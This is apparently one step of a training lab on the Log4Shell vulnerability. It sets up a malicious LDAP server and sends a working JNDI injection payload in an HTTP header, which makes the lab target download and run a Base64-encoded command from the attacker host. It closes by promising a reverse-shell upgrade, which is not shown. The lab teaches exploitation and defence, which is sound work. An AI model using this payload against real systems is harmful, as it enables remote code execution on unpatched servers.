### Setup Malicious LDAP Server and POC

In this challenge, you will be setting up the attacker's infrastructure and sending your first malicious payload to test a Proof of Concept (POC).

1.  Start by swapping to the **Ubuntu Attacker Endpoint**. This can be done by typing `CTRL`, `ALT`, and `Shift` simultaneously and clicking the **Pluralsight** drop down from the top-left.
    
2.  Test network connectivity to the vulnerable application (Remember, a 400 error is expected!):
    
    `curl http://172.31.24.20:8080`
    
3.  Next, you'll need to setup the malicious LDAP server. When you send the payload to the vulnerable app, it will use JNDI to call back to this malicious LDAP server for further instructions. Start with a clean terminal session:
    
    `screen -S ldap`
    
4.  Start the LDAP server:
    
    `sudo docker run --name log4jldapserver -p 1389:1389 -p 8888:8888 oofles/log4shell-ldap-server`
    
    **Note:** You are setting the LDAP server to listen on port **1389** (for LDAP requests) and port **8888** (for the redirected payload commands to be sent over HTTP). 
    
5.  Detach from that session by using the button key combinations of `CTRL + A`, let go, and then press `D`.
    
6.  Now it's time to send the first malicious payload! The vulnerable application is logging the **X-Api-Version** field, so you'll use `curl` to send the payload, changing that field to contain the malicious string:
    
    `curl 172.31.24.20:8080 -H 'X-Api-Version: ${jndi:ldap://172.31.24.10:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZA==}'`
    
    **Note:** The Base64 encoded string translates to: `touch /tmp/pwned`.
    
    **Analysis:** A **Hello World!** response is the method this vulnerable app uses to let you know the request was successful.
    
7.  Check the LDAP server to see if the requests came through successfully:
    
    `screen -r ldap`
    
    **Analysis:** You can see the initial LDAP query come through for `Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZA==`. The server then translates the Base64 payload into a command and passes to a Java class that handles delivery and execution. This payload is then sent to the vulnerable endpoint over port **8888**.
    
8.  Detach from that session by using the button key combinations of `CTRL + A`, let go, and then press `D`.
    
9.  Swap to the **Ubuntu Defender Endpoint**.
    
    `CTRL`, `ALT`, and `Shift`
    
10.  Check the vulnerable application's **/tmp/** directory:
    
    `sudo docker exec vulnapp2 ls /tmp`
    
POC is a success!! However, that wasn't much of an exploit... Before getting into analysis, let's see if we can upgrade the exploit in this next challenge and establish a reverse shell.